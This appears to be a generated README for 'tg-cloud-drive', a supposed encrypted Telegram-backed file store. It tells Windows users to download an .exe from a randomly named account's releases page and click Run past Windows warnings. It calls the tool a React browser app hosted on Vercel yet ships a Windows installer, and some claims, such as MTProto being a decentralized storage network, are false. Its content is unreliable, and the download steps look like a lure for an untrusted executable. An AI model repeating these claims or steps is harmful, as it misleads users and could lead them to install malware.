# ☁️ tg-cloud-drive - Reliable private storage for your files

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/releases)

## 📌 About this software

tg-cloud-drive provides a private way to store files. It uses the Telegram network to keep your data safe. Every file you upload stays private to you. The software encrypts each piece of data before it leaves your computer. No one can see your files or read them. You own your data.

This tool functions like a storage drive in your browser. You can save documents, photos, and videos. It streams media files so you view them without waiting for a full download. The design focuses on security and speed. It runs on your local machine to ensure you remain in control.

## 🛠️ System requirements

This tool runs on any modern Windows computer. Ensure you have these items before you start:

*   Windows 10 or Windows 11.
*   A recent version of Google Chrome, Mozilla Firefox, or Microsoft Edge.
*   An active Telegram account.
*   Internet connection for file syncing.

You do not need to install complex server software. The program handles the connection for you.

## 📥 How to download and run

Follow these steps to set up the software on your Windows machine:

1. Visit the [official releases page](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/releases) to access the latest version of the installer.
2. Look for the section labeled Assets.
3. Click the link that ends in .exe to start the download.
4. Save the file to your desktop or downloads folder.
5. Double-click the saved file to begin the setup.
6. Follow the prompts on your screen. Windows may ask for permission to run the tool. Click Run to proceed.
7. Once installed, find the tg-cloud-drive icon on your desktop and double-click it.

## 🔐 Key features

### Zero-Knowledge privacy
Your files undergo encryption before they leave your device. The software uses AES-256-GCM encryption. This standard protects sensitive information from unauthorized access. Even the developers cannot view your files. You hold the only keys to your data.

### Progressive media streaming
You do not need to download a movie or song completely to play it. The software streams your media files within the interface. It retrieves parts of the file as you need them. This saves time and disk space.

### Decentralized storage
This tool uses the MTProto protocol to distribute your files across the network. It does not rely on a single central server. This structure improves reliability and keeps your data accessible from anywhere.

### Simple interface
The design looks and acts like a standard file folder. You can drag and drop items into the window. It lists your files in a grid or a list. Search tools help you find items quickly.

## ⚙️ Using the software

When you open the tool for the first time, it asks you to sign in with your Telegram account. This links your storage drive to your preferred messaging identity. The software does not read your messages. It only uses the Telegram network as a secure place to store encrypted data chunks.

After you sign in, the main dashboard appears. You see your current storage usage at the bottom of the screen. To add files, drag them from your Windows folder into the application window. The status bar at the top displays the progress of the encryption and upload process.

To view a file, click on its name in the list. Documents open in your default viewer. Images and videos open in the built-in media viewer. To delete a file, right-click the item and select Remove. 

## 🛡️ Privacy and security

Security stays at the heart of this tool. The software never sends your original files to the network. It breaks every file into small 1MB chunks. It encrypts each chunk locally. Only your client holds the information needed to reassemble these chunks. 

If you lose access to your device, you can log in on another computer to sync your drive. As long as you have your Telegram credentials, you maintain access to your files. The zero-knowledge approach means your data remains private even if network providers change their storage policies.

## 💻 Technical details for advanced users

The software uses React and TypeScript for its user interface. It relies on Vite for rapid development and clean builds. TailwindCSS provides the layout and styling. The application utilizes a Service Worker to manage cached data and offline capability. 

Deploying your own instance remains possible if you prefer custom hosting. You can use Vercel or Cloudflare Pages to host the interface. Simply fork the repository and connect your account to your hosting provider. The build process requires no changes for basic deployment. 

## ❓ Frequently asked questions

### Does this use up my Telegram message storage?
No. This tool uses the storage capacity of the MTProto network infrastructure, not your personal message history or chat cloud storage.

### Can I share files with others?
The current version focuses on personal storage. Future updates may include specific features for sharing links. For now, keep your account credentials private to ensure file security.

### Is my internet speed important?
Yes. Media streaming performs best with a stable internet connection. High-resolution videos require more bandwidth. Large file uploads take longer on slower networks.

### Where does the software store my keys?
The software stores local keys in your browser profile or the secure storage area on your Windows machine. Do not share your login credentials with anyone.

### Will the software work if Telegram is down?
The tool requires an active Telegram network connection to sync files. If the network experiences service issues, you might see a temporary connection error. Refresh the page once the signal returns.

### Can I move my files from here to another cloud?
Yes. You can download your files from the tg-cloud-drive interface to your Windows desktop at any time. Once saved locally, you can move them anywhere.